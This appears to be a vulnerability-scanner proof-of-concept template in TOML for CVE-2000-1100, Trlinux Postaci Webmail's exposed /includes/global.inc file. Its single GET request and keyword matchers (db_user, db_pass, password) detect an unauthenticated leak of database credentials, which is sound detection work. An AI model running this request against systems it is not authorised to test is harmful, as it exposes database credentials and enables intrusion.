[info]
author = "ave"
description = "Trlinux Postaci Webmail 1.1.3 默认配置将 /includes/global.inc 配置文件放置于 Web 根目录下，未做访问控制。远程攻击者无需身份认证，通过一次 HTTP GET 请求即可直接读取该文件，获取数据库用户名和密码等敏感信息。"
id = "POC-AVE-2000-0795"
name = "CVE-2000-1100 PoC"
severity = "high"
tags = ["ave-2000-0795"]
vuln_id = [
    "CVE-2000-1100",
    "AVE-2000-0795",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/includes/global.inc"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "db_user",
    "db_pass",
    "database",
    "mysql",
    "postgres",
    "username",
    "password",
]
